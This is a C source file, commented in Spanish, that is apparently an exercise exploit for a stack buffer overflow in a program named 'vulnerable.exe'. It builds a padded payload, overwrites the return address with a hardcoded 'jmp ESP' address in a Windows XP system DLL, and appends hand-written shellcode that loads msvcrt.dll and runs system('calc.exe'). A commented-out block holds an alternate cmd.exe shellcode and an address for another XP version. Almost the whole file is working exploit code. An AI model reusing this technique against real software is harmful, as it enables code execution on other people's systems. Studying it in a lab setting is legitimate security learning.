#include <stdio.h>      // Entrada-Salida
#include <stdlib.h>     // execv()
#include <string.h>     // strcat()



/**
 * Metodo principal.
 *
 * @param argc  Numero de argumentos.
 * @param argv  Argumentos.
 *
 * @return  0 si termina correctamente.
 */
int main (int argc, char **argv) {  // Declarar 'argv' para usarlo con el 'execv'
    // Cadena para detectar el estado de la pila (llenar el buffer y llegar al retorno)
    char payload[1024] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ";


    // Shellcode que ejecuta 'system("calc.exe")', con la llamada a system harcodeado en '\x7b\x46\x86\x7c' 0x7c86467b
    char offset[] = "\x7b\x46\x86\x7c";     // Offset 'jmp ESP' kernel32.dll para Windows XP (SP3)

    strcat(payload, offset);        // Concatenar el offset del 'jmp ESP' al buffer


    // Codigo para ejecutar el payload.
    char shellcode[] =                                      "\x55\x8b\xec"
                        "\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45"
                        "\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45"
                        "\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45"
                        "\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45"
                        "\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3"              // Atento a la direccion (lit.End)
                                                            "\x55\x8b\xec"
                        "\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45"
                        "\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45"
                        "\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45"
                        "\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff"  // Atento a la direccion (lit.End)
                        "\xd3";

    strcat(payload, shellcode);     // Concatenar el shelcode al buffer


    // Ejecutar el payload.
    argv[0] = "vulnerable";     // Definir el argumento 1: el nombre del ejecutable vulnerable
    argv[1] = payload;          // Definir el argumento 2: el argumento del ejecutable
    argv[2] = NULL;             // Apunta a 0: porque no metemos mas argumentos

    execv("vulnerable.exe", argv);   // Se ejecuta 'vulnerable.exe' con el payload como argumento
}

/*
// Shellcode
char shellcode[] = "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\x44\x80\xBF\x77\xFF\xD3";

// Estracto del ASM
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x0c, 0xc6, 0x45, 0xf5, 0x6d, 0xc6, 0x45,
0xf6, 0x73, 0xc6, 0x45, 0xf7, 0x76, 0xc6, 0x45, 0xf8, 0x63, 0xc6, 0x45,
0xf9, 0x72, 0xc6, 0x45, 0xfa, 0x74, 0xc6, 0x45, 0xfb, 0x2e, 0xc6, 0x45,
0xfc, 0x64, 0xc6, 0x45, 0xfd, 0x6c, 0xc6, 0x45, 0xfe, 0x6c, 0x8d, 0x45,
0xf5, 0x50, 0xbb, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd3,
                                                      0x55, 0x8b, 0xec,
0x33, 0xff, 0x57, 0x83, 0xec, 0x08, 0xc6, 0x45, 0xf7, 0x63, 0xc6, 0x45,
0xf8, 0x61, 0xc6, 0x45, 0xf9, 0x6c, 0xc6, 0x45, 0xfa, 0x63, 0xc6, 0x45,
0xfb, 0x2e, 0xc6, 0x45, 0xfc, 0x65, 0xc6, 0x45, 0xfd, 0x78, 0xc6, 0x45,
0xfe, 0x65, 0x8d, 0x45, 0xf7, 0x50, 0xbb, 0xc7, 0x93, 0xc2, 0x77, 0xff,
0xd3

// Direccion de salto (jmp esp)
char offset[] = "\x0F\x98\xF8\x77";     // Offset jmp ESP ntdll32.dll WinXP SP1 Esp
*/
